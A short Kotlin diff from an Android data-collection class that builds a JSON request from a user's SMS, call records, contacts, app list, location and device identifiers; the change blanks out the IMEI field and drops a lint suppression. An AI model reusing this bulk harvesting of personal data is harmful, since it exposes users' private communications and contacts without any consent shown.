@@ -73,7 +73,7 @@ class CollectDataMgr {
         })
     }
 
-    @SuppressLint("MissingPermission")
+
     private fun buildRequestJsonObj(smsStr: String, callRecordStr: String,
                                     contractStr: String, appListStr: String,
                                     locationStr: String, orderId: String): JSONObject {
@@ -104,7 +104,8 @@ class CollectDataMgr {
             //公网IP
             jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
             //手机IMEI
-            jsonObject.put("imei",  PhoneUtils.getIMEI())
+//            jsonObject.put("imei",  PhoneUtils.getIMEI())
+            jsonObject.put("imei",  "")
             //androidId
             jsonObject.put("androidId",  DeviceUtils.getAndroidID())
             jsonObject.put("deviceUniqId",  DeviceUtils.getUniqueDeviceId())
